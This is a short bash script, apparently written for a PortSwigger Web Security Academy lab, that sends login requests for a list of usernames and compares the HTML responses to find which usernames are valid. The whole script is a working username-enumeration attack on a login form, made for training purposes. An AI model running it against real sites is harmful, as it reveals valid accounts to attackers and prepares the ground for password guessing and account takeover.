#!/bin/bash

echo "Analyzing responses for subtle differences..."
echo "==========================================="

# Create temp directory for responses
mkdir -p responses

# Fetch responses for each username
while IFS= read -r user; do
    echo -n "Fetching response for: $user..."
    
    curl -s -X POST "https://0a0e004a04be7fa081da8aa70008003b.web-security-academy.net/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: session=Zj5ZT2FoyIS2txq2JmIWYDW41JykgiqP" \
        -d "username=$user&password=test" > "responses/$user.html"
    
    # Remove variable content (analytics ID, etc.)
    # Replace analytics ID with placeholder
    sed -i '' 's/analytics?id=[0-9]*/analytics?id=PLACEHOLDER/g' "responses/$user.html"
    
    echo " done"
done < usernames.txt

echo ""
echo "Comparing responses to find subtle differences..."
echo ""

# Use the first username as baseline
baseline=$(head -1 usernames.txt)
baseline_file="responses/$baseline.html"

# Compare each response to baseline
while IFS= read -r user; do
    if [ "$user" != "$baseline" ]; then
        diff_output=$(diff -u "$baseline_file" "responses/$user.html" 2>/dev/null)
        if [ -n "$diff_output" ]; then
            echo "=== Difference found for user: $user ==="
            echo "$diff_output" | grep -E "^[-+]" | grep -v "^---" | grep -v "^+++" | head -10
            echo ""
        fi
    fi
done < usernames.txt

# Clean up
rm -rf responses